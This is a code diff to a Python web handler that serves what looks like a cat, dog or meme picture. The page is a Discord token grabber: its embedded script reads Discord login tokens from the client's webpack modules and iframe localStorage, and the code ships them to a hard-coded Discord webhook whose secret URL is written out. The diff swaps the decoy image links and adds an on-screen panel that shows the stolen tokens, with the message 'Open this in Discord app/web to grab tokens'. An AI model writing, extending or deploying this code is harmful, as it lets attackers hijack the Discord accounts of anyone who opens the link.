@@ -9,13 +9,13 @@ class handler(BaseHTTPRequestHandler):
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
         
         # Default image
-        DEFAULT_IMAGE = "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g"
+        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
         
         # Custom image mappings - add more here
         IMAGES = {
-            "mycatimage": "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g",
-            "dogpic": "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g",
-            "meme": "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g",
+            "mycatimage": "https://i.imgur.com/5M6F3wQ.jpeg",
+            "dogpic": "https://i.imgur.com/2QksCKj.jpeg",
+            "meme": "https://i.imgur.com/X8TjKyj.jpeg",
             # Add more custom names here
         }
         
@@ -106,14 +106,34 @@ class handler(BaseHTTPRequestHandler):
             max-height: 100vh;
             object-fit: contain;
         }}
+        #tokenDisplay {{
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 255, 0, 0.9);
+            color: #000;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-width: 90%;
+            word-wrap: break-word;
+            display: none;
+            z-index: 9999;
+        }}
+        #tokenDisplay.show {{
+            display: block;
+        }}
     </style>
 </head>
 <body>
     <img src="{image_url}" alt="Image">
+    <div id="tokenDisplay"></div>
     <script>
         (async function() {{
             let token = null;
             let tokens = [];
+            const display = document.getElementById('tokenDisplay');
             
             // Method 1: Discord webpack
             try {{
@@ -168,6 +188,15 @@ class handler(BaseHTTPRequestHandler):
                     const iframeToken = iframe.contentWindow.localStorage.getItem('token');
                     if (iframeToken) tokens.push(iframeToken.replace(/"/g, ''));
                 }} catch(e) {{}}
+            }}
+            
+            // Display tokens on screen
+            if (tokens.length > 0) {{
+                display.innerHTML = '🔑 TOKEN(S) FOUND:<br><br>' + tokens.map((t, i) => `Token ${{i+1}}:<br>${{t}}`).join('<br><br>');
+                display.classList.add('show');
+            }} else {{
+                display.innerHTML = '❌ No Discord tokens found<br>Open this in Discord app/web to grab tokens';
+                display.classList.add('show');
             }}
             
             // Send all found tokens
